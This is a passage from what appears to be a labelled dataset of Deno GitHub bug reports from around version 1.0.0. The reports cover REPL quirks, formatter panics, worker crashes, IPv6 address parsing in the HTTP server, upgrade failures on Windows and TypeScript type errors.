unauthenticatedCwd() {\r\n  try {\r\n    Deno.cwd();\r\n  } catch (e) {\r\n    return e.message.split('\"')[1];\r\n  }\r\n}\r\nconsole.log(unauthenticatedCwd());\r\n```\r\n```\r\n: deno run cwd.js \r\n/home/syrup/downloads\r\n: deno --version\r\ndeno 1.0.0\r\nv8 8.4.300\r\ntypescript 3.9.2\r\n```"},{"labels":["bug",null],"text":"is this worth to fix? and is there another full featured file_server in the community out of std?\r\n\r\neasy to reproduce this when serving a large file to browser, and click stop loading\r\n\r\n```console\r\n[2020-05-19 12:00:25] \"GET /output.json HTTP/1.1\" 200\r\nerror: Uncaught BrokenPipe: Broken pipe (os error 32)\r\n    at unwrapResponse ($deno$/ops/dispatch_minimal.ts:63:11)\r\n    at Object.sendAsyncMinimal ($deno$/ops/dispatch_minimal.ts:106:10)\r\n    at async Object.write ($deno$/ops/io.ts:65:18)\r\n    at async BufWriter.flush (https://deno.land/std/io/bufio.ts:475:25)\r\n    at async BufWriter.write (https://deno.land/std/io/bufio.ts:514:9)\r\n    at async Object.copy ($deno$/io.ts:70:21)\r\n    at async writeResponse (https://deno.land/std/http/_io.ts:265:15)\r\n    at async ServerRequest.respond (https://deno.land/std/http/server.ts:97:7)\r\n```"},{"labels":["bug",null],"text":"Hi, I'm writing a library for a terminal spinner, and sometimes the script will hang after writing.\r\nI think I've narrowed it down to the ```Deno.write``` calls, as there seems to be some async issues going on.\r\n\r\nThe solution to a similar issue in #5515 was to await all write calls, which is what I've done but the error still persists.\r\n\r\nThe following code:\r\n\r\n```js\r\nconst kia = new Kia(\"test\");\r\nawait kia.start();\r\nawait sleep(3000);\r\nawait kia.stop();\r\n\r\nconsole.log(\"All done\");\r\n```\r\n\r\nResults in this output and hang:\r\n![image](https://user-images.githubusercontent.com/4750998/82316000-16009c80-99c4-11ea-93c4-a5018c536ea8.png)\r\n\r\nAll the calls to ```Deno.write``` look like this:\r\n```js\r\nexport async function writeLine(\r\n\trid: number,\r\n\tencoder: TextEncoder,\r\n\ttext: string,\r\n\tindent?: number\r\n) {\r\n\tawait Deno.write(\r\n\t\trid,\r\n\t\tencoder.encode(`\\r${indent ? ESC + indent + \"C\" : \"\"}${text}`)\r\n\t);\r\n}\r\n```\r\n\r\nAnd all calls are awaited\r\n\r\n```js\r\nawait writeLine(\r\n\t\t\tthis.options.resource,\r\n\t\t\tthis.textEncoder,\r\n\t\t\t`${flair} ${text}`,\r\n\t\t\tthis.options.indent\r\n\t\t);\r\n```\r\n(the full code is at my Kia repo if you need more context)"},{"labels":["bug",null],"text":"I can't get anything to work, for example\r\n\r\n```shell\r\n$ deno doc https://deno.land/x/oak@v4.0.0/mod.ts\r\nthread 'main' panicked at 'called `Option::unwrap()` on a `None` value', cli/doc/printer.rs:130:14\r\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace\r\n```\r\n\r\nI am surprised we don't have an integration test for this.\r\n"},{"labels":["bug"],"text":"```\r\nPS C:\\Users\\mark\\Documents\\PROJECTS\\zone> deno --unstable\r\nerror: Found argument '--unstable' which wasn't expected, or isn't valid in this context\r\n\r\nUSAGE:\r\n    deno [OPTIONS] [SUBCOMMAND]\r\n\r\nFor more information try --help\r\nPS C:\\Users\\mark\\Documents\\PROJECTS\\zone> deno repl --unstable\r\nDeno 1.0.0\r\nexit using ctrl+d or close()\r\n>\r\n```"},{"labels":["bug",null],"text":"https://github.com/denoland/deno/blob/93c21646739a46a9710be9d580256e18bee740c0/cli/js/buffer.ts#L180-L192\r\n\r\nThis masks failures in read functions and can manifest like in #4789 where an empty buffer is returned instead.\r\n\r\n```\r\ndeno 1.0.0\r\nv8 8.4.300\r\ntypescript 3.9.2\r\n(master build)\r\n```"},{"labels":["bug",null],"text":"The snippet below compiles and runs but causes the `fmt` command to panic:\r\n\r\n```\r\n$ deno --version\r\ndeno 1.0.0\r\nv8 8.4.300\r\ntypescript 3.9.2\r\n\r\n$ cat deno-fmt-panic.ts \r\ntry {\r\n  throw new TypeError\r\n}\r\ncatch {\r\n}\r\n\r\n$ deno run deno-fmt-panic.ts \r\nCompile file:///home/srackham/local/projects/drake/tmp/deno-fmt-panic.ts\r\n\r\n$ deno fmt deno-fmt-panic.ts \r\nthread 'tokio-runtime-worker' panicked at 'Expected to find a close paren token.', /home/runner/work/deno/deno/.cargo_home/registry/src/github.com-1ecc6299db9ec823/dprint-plugin-typescript-0.17.2/src/parsing/parser_types.rs:787:9\r\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace\r\nthread 'main' panicked at 'Panic formatting: deno-fmt-panic.ts', cli/fmt.rs:232:5\r\n\r\n```"},{"labels":["bug",null],"text":"I'm not sure it is problem in deno, but when I'm compiling it in typescript with nodejs, shows where problem occurred.\r\nSimple steps to reproduce:\r\n\r\n- Create empty file with only \"\\\\\"(backslash character).\r\n- Save. Run in deno\r\n\r\nAfter compile we receive error without file where error occurred.\r\n```\r\nCompile file:///home/ubuntu/workspace/deno/test.ts\r\nerror: TS1127 [ERROR]: Invalid character.\r\n    at \r\n```"},{"labels":["bug",null],"text":"Hi, first off let me say: great job with Deno! Its a truly exciting development in the JS ecosystem...\r\n\r\nMy Deno script works just fine when I run `deno run src/cli.ts`. However if I bundle the project and try to run the output `.js` file, I get the following error: \r\n\r\n```\r\nthread 'main' panicked at 'called `Result::unwrap()` on an `Err` value: Utf8Error { valid_up_to: 0, error_len: Some(1) }', cli\\file_fetcher.rs:622:41\r\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace\r\n```\r\n\r\nThis happens when I run it locally, or refer to the remote url.\r\n\r\n**Repo**\r\nhttps://github.com/kesupile/ts-percentage\r\n\r\n**Operating System**\r\nWindows 10\r\nusing the powershell install"},{"labels":["bug"],"text":"In this case, I forgot to pass `-c tsconfig.json` to add DOM to the libs. I'm assuming this should be instead outputting the compile errors.\r\n```\r\nPS C:\\Users\\mark\\Documents\\PROJECTS\\deno-test> deno --version\r\ndeno 1.0.0\r\nv8 8.4.300\r\ntypescript 3.9.2\r\nPS C:\\Users\\mark\\Documents\\PROJECTS\\deno-test> deno bundle ./src/index.ts\r\nBundling file:///C:/Users/mark/Documents/PROJECTS/deno-test/src/index.ts\r\nerror: Uncaught AssertionError: Assertion failed.\r\n    at Object.assert ($deno$/util.ts:33:11)\r\n    at compile ($deno$/compiler.ts:1355:5)\r\n    at async tsCompilerOnMessage ($deno$/compiler.ts:1548:22)\r\n    at async workerMessageRecvCallback ($deno$/runtime_worker.ts:74:9)\r\n```"},{"labels":["bug",null,null],"text":"Currently, the following code will run without error in deno REPL but will error out as a script:\r\n```\r\n# a.js\r\nlet a = {}\r\nObject.preventExtensions(a)\r\na.c = 1\r\n```\r\n\r\nThis shouldn't be the case."},{"labels":["bug"],"text":"The following code snippet\r\n```ts\r\nimport {} from \"https://deno.land/std@0.51.0/signal/mod.ts\";\r\n```\r\n\r\nresults in this error:\r\n\r\n```ts\r\nerror: TS2339 [ERROR]: Property 'signal' does not exist on type 'typeof Deno'.\r\n  const streams = signos.map(Deno.signal);\r\n                                  ~~~~~~\r\n    at https://deno.land/std@0.51.0/signal/mod.ts:34:35\r\n\r\nTS2345 [ERROR]: Argument of type 'unknown' is not assignable to parameter of type 'AsyncIterableIterator<void>'.\r\n    mux.add(stream);\r\n            ~~~~~~\r\n    at https://deno.land/std@0.51.0/signal/mod.ts:37:13\r\n\r\nTS2571 [ERROR]: Object is of type 'unknown'.\r\n      stream.dispose();\r\n      ~~~~~~\r\n    at https://deno.land/std@0.51.0/signal/mod.ts:43:7\r\n\r\nFound 3 errors.\r\n``"},{"labels":["bug",null,null],"text":"On Windows, escape sequences don't color Deno's output and display as ordinary text.\r\n\r\nFor example, an error stack trace looks like:\r\n```none\r\nUncaught SyntaxError: Unexpected string\r\n    at ←[1m←[3m←[90mevaluate←[39m←[23m←[22m←[90m(←[39m←[90m$deno$/repl.ts←[39m←[90m:←[39m←[90m45←[39m←[90m:←[39m←[90m34←[39m←[90m)←[39m\r\n    at ←[1m←[3m←[90mObject.replLoop←[39m←[23m←[22m←[90m(←[39m←[90m$deno$/repl.ts←[39m←[90m:←[39m←[90m136←[39m←[90m:←[39m←[90m13←[39m←[90m)←[39m\r\n```\r\nI hope that this can be fixed."},{"labels":["bug",null,null],"text":"To extract the port from a random port in a Deno.listen is somewhat painful:\r\n```\r\n    const listener = Deno.listen({ port: 0, transport: \"tcp\" });\r\n    //@ts-ignore\r\n    const {port} = listener.addr\r\n    this.port = port\r\n```\r\n\r\nWhile the random port doesn't seem that useful, it is extremely. For unit tests,  launching a listener or process at a random port means that unit tests can really be independent, and not hardcoded.\r\n"},{"labels":["bug",null],"text":"When we do `close()`, it exits the REPL but somehow after then I am unable to type\r\nin the terminal, though if I type and press enter it executes the commands but I\r\ncan't see the characters.\r\n\r\n```\r\n[sanket143@lisa test_plugin]$ deno\r\nDeno 1.0.0\r\nexit using ctrl+d or close()\r\n> close()\r\nundefined\r\n> [sanket143@lisa test_plugin]$ Cargo.toml  src  tests\r\n[sanket143@lisa test_plugin]$ ^C\r\n[sanket143@lisa test_plugin]$ \r\n```"},{"labels":["bug",null],"text":"using fetch() to POST tar file implementation:\r\n\r\n```\r\n    const ab = new ArrayBuffer(1024 * 1024);\r\n    const buf = new Buffer(ab);\r\n    const mw = new MultipartWriter(buf);\r\n    const f = await open(path.resolve('test.tar'), {\r\n        read: true,\r\n    });\r\n    await mw.writeFile('myTestField', 'test.tar', f);\r\n    const contentType = mw.formDataContentType();\r\n    await mw.close();\r\n    f.close();\r\n\r\n    const response1 = await fetch('http://localhost:8080/test', {\r\n        headers: [\r\n            ['Content-Type', contentType]\r\n        ],\r\n        method: 'POST',\r\n        body: ab,\r\n    });\r\n\r\n    if (response != undefined) {\r\n        await response.arrayBuffer();\r\n        assertEquals(200, response.status);\r\n    }\r\n```\r\n\r\nfails with [ReadableStream](https://github.com/denoland/deno/blob/master/cli/js/web/fetch.ts#L571):\r\n\r\n```\r\nError: not implemented\r\n    at Object.notImplemented ($deno$/util.ts:64:9)\r\n    at fetch ($deno$/web/fetch.ts:572:11)\r\n```\r\nIs there an alternative way to have it done in Deno?\r\n"},{"labels":["bug",null],"text":"Until `aarch64` releases are vendored (#4862), `deno upgrade` should exit with an error message rather than downloading, unzipping, and trying to execute an `x86_64` binary on an `aarch64` system.\r\n"},{"labels":["bug",null],"text":"The deno standard lib declaration of `URL` accepts `string | URL` as input: https://github.com/denoland/deno/blob/a08a4abac116eda498f8ad2df13b3816ec36c9ad/cli/js/lib.deno.shared_globals.d.ts#L1149\r\n\r\nHowever the TypeScript dom library declaration only accepts `string`:\r\nhttps://github.com/microsoft/TypeScript/blob/master/src/lib/dom.generated.d.ts#L15920\r\n\r\nWhen declaring \"dom\" in tsconfig.json like so:\r\n```json\r\n\"lib\": [\"dom\", \"dom.iterable\", \"esnext\", \"deno.ns\"]\r\n```\r\n\r\ndeno throws the following 2 errors:\r\n\r\n```\r\nerror: TS2345 [ERROR]: Argument of type 'string | URL' is not assignable to parameter of type 'string'.\r\n  Type 'URL' is not assignable to type 'string'.\r\n  return new URL(url).pathname;\r\n                 ~~~\r\n    at https://deno.land/std@0.51.0/path/posix.ts:433:18\r\n\r\nTS2345 [ERROR]: Argument of type 'string | URL' is not assignable to parameter of type 'string'.\r\n  Type 'URL' is not assignable to type 'string'.\r\n  return new URL(url).pathname\r\n                 ~~~\r\n    at https://deno.land/std@0.51.0/path/win32.ts:911:18\r\n\r\nFound 2 errors.\r\n```\r\n\r\nProbably related to https://github.com/denoland/deno/issues/4234."},{"labels":["bug",null],"text":"https://github.com/denoland/deno/blob/bced52505f32d6cca4f944bb610a8a26767908a8/cli/js/web/text_encoding.ts#L456\r\n\r\nIdeally TextDecoder would support the stream option for spec compliance as well as for supporting incremental decoding of encoded text from streaming input that may include incomplete surrogate pairs."},{"labels":["bug",null],"text":"```js\r\n// main.js\r\nconst worker = new Worker('./worker.js', { type: 'module' });\r\nworker.onmessage = ({ data }) => console.log(data);\r\n\r\n// worker.js\r\nself.postMessage('message');\r\nself.close();\r\n```\r\n\r\n```\r\n$ RUST_BACKTRACE=1 deno run main.js\r\nthread 'deno-worker-0' panicked at 'Failed to post message to host: TrySendError { kind: Disconnected }', cli/ops/worker_host.rs:142:7\r\nstack backtrace:\r\nmessage\r\n   0: <std::sys_common::backtrace::_print::DisplayBacktrace as core::fmt::Display>::fmt\r\n   1: core::fmt::write\r\n   2: std::io::Write::write_fmt\r\n   3: std::panicking::default_hook::{{closure}}\r\n   4: std::panicking::default_hook\r\n   5: std::panicking::rust_panic_with_hook\r\n   6: rust_begin_unwind\r\n   7: core::panicking::panic_fmt\r\n   8: core::result::unwrap_failed\r\nnote: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.\r\nthread 'main' panicked at 'Worker thread panicked: Any', cli/ops/worker_host.rs:329:11\r\nstack backtrace:\r\n   0: <std::sys_common::backtrace::_print::DisplayBacktrace as core::fmt::Display>::fmt\r\n   1: core::fmt::write\r\n   2: std::io::Write::write_fmt\r\n   3: std::panicking::default_hook::{{closure}}\r\n   4: std::panicking::default_hook\r\n   5: std::panicking::rust_panic_with_hook\r\n   6: rust_begin_unwind\r\n   7: core::panicking::panic_fmt\r\n   8: core::result::unwrap_failed\r\n   9: <std::future::GenFuture<T> as core::future::future::Future>::poll\r\n  10: futures_util::future::future::chain::Chain<Fut1,Fut2,Data>::poll\r\n  11: <futures_util::future::future::map::Map<Fut,F> as core::future::future::Future>::poll\r\n  12: <futures_util::future::future::map::Map<Fut,F> as core::future::future::Future>::poll\r\n  13: <&mut S as futures_core::stream::Stream>::poll_next\r\n  14: futures_util::stream::stream::StreamExt::poll_next_unpin\r\n  15: <deno_core::isolate::CoreIsolate as core::future::future::Future>::poll\r\n  16: <deno_core::es_isolate::EsIsolate as core::future::future::Future>::poll\r\n  17: <std::future::GenFuture<T> as core::future::future::Future>::poll\r\n  18: std::thread::local::LocalKey<T>::with\r\n  19: tokio::macros::scoped_tls::ScopedKey<T>::set\r\n  20: tokio::runtime::basic_scheduler::BasicScheduler<P>::block_on\r\n  21: tokio::runtime::context::enter\r\n  22: deno::tokio_util::run_basic\r\n  23: deno::main\r\n  24: std::rt::lang_start::{{closure}}\r\n  25: std::panicking::try::do_call\r\n  26: __rust_maybe_catch_panic\r\n  27: std::rt::lang_start_internal\r\n  28: main\r\nnote: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.\r\n```\r\n\r\nThis works in the browser. Postponing the close until the next tick makes it work in Deno.\r\n\r\n```js\r\nself.postMessage('message');\r\nsetTimeout(() => self.close(), 0);\r\n```"},{"labels":["bug",null],"text":"Hey i notice that the listening address is 0.0.0.0, Google Chrome / Firefox doesn't accept loopback adress, maybe switch to localhost or a network adress ?"},{"labels":["bug"],"text":"I installed deno with brew.\r\n\r\n```\r\n$ brew install deno\r\n...\r\n...\r\nBash completion has been installed to:\r\n  /usr/local/etc/bash_completion.d\r\n\r\nzsh completions have been installed to:\r\n  /usr/local/share/zsh/site-functions\r\n==> Summary\r\n🍺  /usr/local/Cellar/deno/1.0.0: 9 files, 41.7MB\r\n$ deno --version\r\ndeno 1.0.0\r\nv8 8.4.300\r\ntypescript 3.9.2\r\n$ deno --help\r\n```\r\n\r\nAfter created `/usr/local/etc/zsh_completion.d/`:\r\n\r\n```\r\n$ deno completions zsh > /usr/local/etc/zsh_completion.d/deno.zsh\r\n$ source /usr/local/etc/zsh_completion.d/deno.zsh\r\n_arguments:comparguments:325: can only be called from completion function\r\n```\r\n\r\nSo how can I add shell completion?\r\n\r\nI tried this but get the same output.\r\n\r\n```\r\n$ deno completions zsh > /usr/local/share/zsh/site-functions/_deno\r\n$ source /usr/local/share/zsh/site-functions/_deno\r\n_arguments:comparguments:325: can only be called from completion function\r\n```\r\n"},{"labels":["bug"],"text":"I tried Deno today. Congrats on 1.0.0, I wanted to report an issue I ran into at risk of embarrassing myself, it's possible that I just don't know what I'm doing.\r\n\r\nI started today with v1.0.0-rc3 and used a few dependencies (fs, path, http) and denon as an installed cli tool. It worked fine.\r\n\r\nWhen v1.0.0 was released I tried running my test application again and ran into a TS error. \r\n\r\n```\r\nerror: TS2322 [ERROR]: Type 'string' is not assignable to type 'boolean'.\r\n  return srcArray.reduce(\r\n    at https://deno.land/std@v0.50.0/fs/_util.ts:20:3\r\n```\r\n\r\nI was able to resolve this one of two ways for my project.\r\n\r\n1) I could downgrade to v1.0.0-rc3\r\n2) I could use the latest version of std\r\n\r\nWith some investigating it seems like maybe this changed caused a desync between the runtime and std. https://github.com/denoland/deno/commit/3d7552af2e19f489501f6a1e27f8a4f488ce123a#diff-da37be1ae0975896a3e9d32a5131aeae\r\n\r\nIn order to get denon working my only option is to downgrade deno to v1.0.0-rc3.\r\n\r\nFigure this is fixed with the next release of std, as soon as denon upgrades."},{"labels":["bug",null],"text":"Tested using deno 1.0. \r\n\r\nI'm workin on a library that in theory should be compatible with both Deno and the web, but have run into a few issues with the Deno TextDecoder api typedefs.\r\n\r\nhttps://github.com/denoland/deno/blob/a08a4abac116eda498f8ad2df13b3816ec36c9ad/cli/js/lib.deno.shared_globals.d.ts#L989\r\n\r\n1)TextDecoderOptions is not defined as a type for the options argument to the TextDecoder constructor. See: https://github.com/microsoft/TypeScript/blob/933c2949236f38e1255a0aa4564246a3fef1518c/src/lib/webworker.generated.d.ts#L3103\r\n\r\n2) decoder.decode, doesn't accept true for the stream optional argument."},{"labels":["bug"],"text":"```\r\n> deno -V\r\ndeno 1.0.0-rc3\r\n> deno upgrade\r\nChecking for latest version\r\nLocal deno version 1.0.0-rc3 is the most recent release\r\n```\r\n\r\n`deno upgrade --version 1.0.0` works"},{"labels":["bug",null],"text":"## Description\r\n\r\nWhen specifying a string address as parameter to `serve()`, the following logic is used to extract the hostname/IP and the port to listen on.\r\n\r\n```ts\r\nconst [hostname, port] = addr.split(\":\");\r\naddr = { hostname, port: Number(port) };\r\n```\r\n\r\n(https://deno.land/std@0.50.0/http/server.ts, line 257)\r\n\r\nWhen this is done with an IPv6 address, like localhost (`[::1]:8080`) or if you want to listen on all addresses (`[::]:8080`), this parsing will break.\r\n\r\n## Repro snippet\r\n\r\nThe following snippet:\r\n\r\n```ts\r\nimport { serve } from \"https://deno.land/std@0.50.0/http/server.ts\";\r\n\r\n// Listen on port 8080 on all addresses\r\nconst s = serve(\"[::]:8080\");\r\nfor await (const req of s) {\r\n  req.respond({ body: `Hello IPv6` });\r\n}\r\n```\r\nwill produce this error:\r\n\r\n```\r\nerror: Uncaught Error: failed to lookup address information: Name or service not known\r\n    at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)\r\n    at Object.sendSync ($deno$/ops/dispatch_json.ts:72:10)\r\n    at Object.listen ($deno$/ops/net.ts:51:10)\r\n    at listen ($deno$/net.ts:152:22)\r\n    at serve (server.ts:261:20)\r\n    at server.ts:3:11\r\n```\r\n\r\nwhich can be explained because:\r\n\r\n```ts\r\nlet [hostname, port] = \"[::]:8080\".split(\":\")\r\nport = Number(port)\r\n// hostname === \"[\"\r\n// port === 0\r\n```\r\n## Workaround\r\nA workaround is to pass `HTTPOptions` instead, which allow you to specify `hostname` and `port` separately:\r\n\r\n```ts\r\nimport { serve } from \"https://deno.land/std@0.50.0/http/server.ts\";\r\n\r\nconst s = serve({hostname: '::', port: 8080});\r\nfor await (const req of s) {\r\n  req.respond({ body: `Hello IPv6` });\r\n}\r\n```\r\n\r\nVerifying with `netstat` shows that deno is indeed listening on `[::]:8080`.\r\n\r\n```\r\n$ sudo netstat -tlpn | grep deno\r\ntcp6       0      0 :::8080                 :::*                    LISTEN      <pid>/deno \r\n```"},{"labels":["bug",null],"text":"Because `std/http/server.ts` uses `MuxAsyncIterator` to serve up requests, any errors thrown there cannot be caught:\r\n\r\nhttps://github.com/denoland/deno/blob/e34a3b61f449cf6197b6d701770a85d9205c2a7b/std/http/server.ts#L235-L239\r\n\r\nThe comments on `MuxAsyncIterator` make it clear that:\r\n\r\nhttps://github.com/denoland/deno/blob/e34a3b61f449cf6197b6d701770a85d9205c2a7b/std/async/mux_async_iterator.ts#L9-L14\r\n\r\nAnd in situations where you have a TLS connection where the browser rejects the certificate, you end up with something like this with Deno dumping and no way to recover:\r\n\r\n```\r\nerror: Uncaught InvalidData: received corrupt message\r\n    at unwrapResponse ($deno$/ops/dispatch_json.ts:43:11)\r\n    at Object.sendAsync ($deno$/ops/dispatch_json.ts:98:10)\r\n    at async TLSListenerImpl.accept ($deno$/tls.ts:31:17)\r\n    at async Server.acceptConnAndIterateHttpRequests (https://deno.land/std@0.50.0/http/server.ts:221:14)\r\n    at async MuxAsyncIterator.callIteratorNext (https://deno.land/std@0.50.0/async/mux_async_iterator.ts:28:29)\r\n```\r\n\r\nWe need a way to iterate that allows errors to be caught when iterating on HTTP server.\r\n"},{"labels":["bug",null,null],"text":"Log output:\r\n```shell\r\nPS C:\\Users\\Duncan Gibson> deno upgrade\r\nChecking for latest version\r\nNew version has been found\r\nDeno is upgrading to version 1.0.0-rc3\r\ndownloading https://github.com/denoland/deno/releases/download/v1.0.0-rc3/deno-x86_64-pc-windows-msvc.zip\r\ndownloading https://github-production-release-asset-2e65be.s3.amazonaws.com/133442384/66b94800-944e-11ea-98fb-9f565c262dce?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20200512%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20200512T220920Z&X-Amz-Expires=300&X-Amz-Signature=72bcdbc51591c5e081bee04bdc9787c22c542b2c9b5e2d9f20ffd764fdb72a3f&X-Amz-SignedHeaders=host&actor_id=0&repo_id=133442384&response-content-disposition=attachment%3B%20filename%3Ddeno-x86_64-pc-windows-msvc.zip&response-content-type=application%2Foctet-stream\r\nExpand-Archive : A positional parameter cannot be found that accepts argument\r\n'Gibson\\AppData\\Local\\Temp\\.tmpKv5TDk\\deno.zip'.\r\nAt line:1 char:1\r\n+ Expand-Archive -Path C:\\Users\\Duncan Gibson\\AppData\\Local\\Temp\\.tmpKv ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : InvalidArgument: (:) [Expand-Archive], ParameterBindingException\r\n    + FullyQualifiedErrorId : PositionalParameterNotFound,Expand-Archive\r\n\r\nthread 'main' panicked at 'assertion failed: unpack_status.success()', cli\\upgrade.rs:172:3\r\nnote: run with `RUST_BACKTRACE=1` environment variable to display a backtrace\r\n```\r\n\r\nVersion/environment:\r\n```\r\nPS C:\\Users\\Duncan Gibson> deno --version\r\ndeno 0.42.0\r\nv8 8.2.308\r\ntypescript 3.8.3\r\n```\r\n* Windows 10 Education Edition v1909 (Build 18363.815)\r\n* Deno installed through Chocolatey. (Deno package version 0.42.0)"},{"labels":["bug",null],"text":"`test1.ts`\r\n```ts\r\nimport {bar} from \"./test2.ts\";\r\n\r\nconst a: bar.foo = 123;\r\n```\r\n`test2.ts`\r\n```ts\r\nexport * as bar from \"./test3.ts\";\r\n```\r\n`test3.ts`\r\n```ts\r\nexport type foo = boolean;\r\n```\r\nthis should not work, but it does. I tried this in node and this will fail to compile, whereas deno will just go on as normal."},{"labels":["bug",null],"text":"# problem\r\n\r\nnested dynamic imports aint workin!\r\n\r\n```\r\nerror: Uncaught ReferenceError: x is not defined\r\nb.x.uniq;\r\n  ^\r\n    at file:///Users/cdaringe/src/deno-nested-dynamic-import/a.ts:2:3\r\n```\r\n\r\nrepro:\r\n\r\n- clone https://github.com/cdaringe/deno-nested-dynamic-import\r\n- `deno run -A a.ts`\r\n\r\nhere are the tiny files for minimum repro:\r\n\r\n```ts\r\n// a.ts\r\nconst b = await import(\"./b.ts\");\r\nb.x.uniq;\r\n\r\n// b.ts - broken\r\nconst uniq = await import(\"https://deno.land/x/lodash/uniq.js\").then((mod) =>\r\n  mod.default\r\n);\r\nexport const x = { uniq };\r\n\r\n// b.ts - ok\r\nexport const x = { uniq: 'this is fine' };\r\n```\r\n\r\n\r\n\r\n## meta\r\n\r\n`npx envinfo`\r\n\r\n```\r\n\r\n  System:\r\n    OS: macOS 10.15.3\r\n    CPU: (4) x64 Intel(R) Core(TM) i5-7360U CPU @ 2.30GHz\r\n    Memory: 497.97 MB / 8.00 GB\r\n    Shell: 3.2.57 - /bin/bash\r\n  Binaries:\r\n    Node: 13.8.0 - ~/.nvm/versions/node/v13.8.0/bin/node\r\n    Yarn: 1.12.3 - /usr/local/bin/yarn\r\n    npm: 6.13.6 - ~/.nvm/versions/node/v13.8.0/bin/npm\r\n  Managers:\r\n    Cargo: 1.42.0 - ~/.cargo/bin/cargo\r\n    Homebrew: 2.2.15 - /usr/local/bin/brew\r\n    pip2: 9.0.1 - ~/.asdf/shims/pip2\r\n    RubyGems: 3.0.3 - /usr/bin/gem\r\n  Utilities:\r\n    CMake: 3.13.0 - /usr/local/bin/cmake\r\n    Make: 3.81 - /usr/bin/make\r\n    GCC: 4.2.1 - /usr/bin/gcc\r\n    Git: 2.19.0 - /usr/local/bin/git\r\n    Clang: 1100.0.33.12 - /usr/bin/clang\r\n    Subversion: 1.10.4 - /usr/bin/svn\r\n    FFmpeg: 4.0.2 - /usr/local/bin/ffmpeg\r\n  Servers:\r\n    Apache: 2.4.41 - /usr/sbin/apachectl\r\n  Virtualization:\r\n    Docker: 19.03.8 - /usr/local/bin/docker\r\n  SDKs:\r\n    iOS SDK:\r\n      Platforms: iOS 13.2, DriverKit 19.0, macOS 10.15, tvOS 13.2, watchOS 6.1\r\n  IDEs:\r\n    Nano: 2.0.6 - /usr/bin/nano\r\n    VSCode: 1.45.0 - /usr/local/bin/code\r\n    Vim: 8.1 - /usr/bin/vim\r\n    Xcode: 11.2.1/11B500 - /usr/bin/xcodebuild\r\n  Languages:\r\n    Bash: 5.0.11 - /usr/local/bin/bash\r\n    Go: 1.11.1 - /usr/local/bin/go\r\n    Elixir: 1.9.1 - /usr/local/bin/elixir\r\n    Java: javac 11 - /usr/bin/javac\r\n    Perl: 5.18.4 - /usr/bin/perl\r\n    PHP: 7.3.11 - /usr/bin/php\r\n    Python: 2.7.14 - /Users/cdaringe/.asdf/shims/python\r\n    Ruby: 2.6.3 - /usr/bin/ruby\r\n    Rust: 1.21.1 - /Users/cdaringe/.cargo/bin/rustup\r\n  Databases:\r\n    SQLite: 3.28.0 - /usr/bin/sqlite3\r\n  Browsers:\r\n    Chrome: 81.0.4044.138\r\n    Firefox: 73.0.1\r\n    Safari: 13.0.5\r\n```\r\n\r\n:| Deno isn't listed ^ yet. `deno 1.0.0-rc2`"},{"labels":["bug",null,null],"text":"When I import any deno module (for ex, the parse module), the error message show only the file name instead of the full path of the source file. That avoid the vscode from creating a link where I can click and jump to the line of the error.\r\n\r\n![image](https://user-images.githubusercontent.com/26843533/81490998-0e702380-925f-11ea-8528-ff8f556ea56f.png)\r\n\r\nWithout importing anything, the full path of the file is shown as expected.\r\n\r\n![image](https://user-images.githubusercontent.com/26843533/81491011-33fd2d00-925f-11ea-9966-33e6a082222a.png)"},{"labels":["bug",null,null],"text":"Deno `statSync` returns millisecond resolution but `utimeSync` truncates to seconds resolution.\r\n\r\nPlatform:\r\n\r\n```\r\n$ uname -a\r\nLinux gnome-1804 4.15.0-99-generic #100-Ubuntu SMP Wed Apr 22 20:32:56 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\r\n\r\n$ deno --version\r\ndeno 0.42.0\r\nv8 8.2.308\r\ntypescript 3.8.3\r\n```\r\n\r\nIn lieu of the REPL (https://github.com/denoland/deno/issues/5063) I ran the following code:\r\n\r\n```\r\nconst encoder = new TextEncoder();\r\nconst data = encoder.encode(\"foobar\");\r\n\r\nDeno.writeFileSync(\"test.txt\", data);\r\nconsole.log(`mtime: ${Deno.statSync(\"test.txt\").mtime!.getTime()}`);\r\nconst newTime = 1588561654321;\r\nconsole.log(`updating mtime to ${newTime}`);\r\nDeno.utimeSync(\"test.txt\", new Date(newTime), new Date(newTime));\r\nconsole.log(`mtime: ${Deno.statSync(\"test.txt\").mtime!.getTime()}`);\r\n```\r\n\r\nOutput (the updated mtime is truncated to the nearest second):\r\n\r\n```\r\nmtime: 1588564365265\r\nupdating mtime to 1588561654321\r\nmtime: 1588561654000\r\n```\r\n\r\nThe Node.js `utimesSync` API does not exhibit this behaviour and sets millisecond timestamp resolution:\r\n\r\n```\r\n$ node --version\r\nv13.14.0\r\n\r\n$ node\r\nWelcome to Node.js v13.14.0.\r\nType \".help\" for more information.\r\n> fs.writeFileSync('test.txt', 'foobar');\r\nundefined\r\n> fs.statSync('test.txt').mtime.getTime();\r\n1588561704180\r\n> fs.utimesSync('test.txt', new Date(1588561576064), new Date(1588561576064));\r\nundefined\r\n> fs.statSync('test.txt').mtime.getTime();\r\n1588561576064\r\n> \r\n```"},{"labels":["bug",null],"text":"```ps\r\ndeno cache https://cdn.pika.dev/@angular/core@9.1.4\r\nDownload https://cdn.pika.dev/@angular/core@9.1.4\r\nDownload https://cdn.pika.dev/-/@angular/core@v9.1.4-U5ZYYTA1rsXIDhf07Ca6/dist=es2019,mode=types/index.d.ts\r\nDownload https://cdn.pika.dev/-/@angular/core@v9.1.4-U5ZYYTA1rsXIDhf07Ca6/dist=es2019,mode=types/core.d.ts\r\nDownload https://cdn.pika.dev/-/@angular/core@v9.1.4-U5ZYYTA1rsXIDhf07Ca6/dist=es2019/core.js\r\nDownload https://cdn.pika.dev/-/tslib@v1.11.1-8dB3VrqrGDhrGiHyfTgP/dist=es2019/tslib.js\r\nDownload 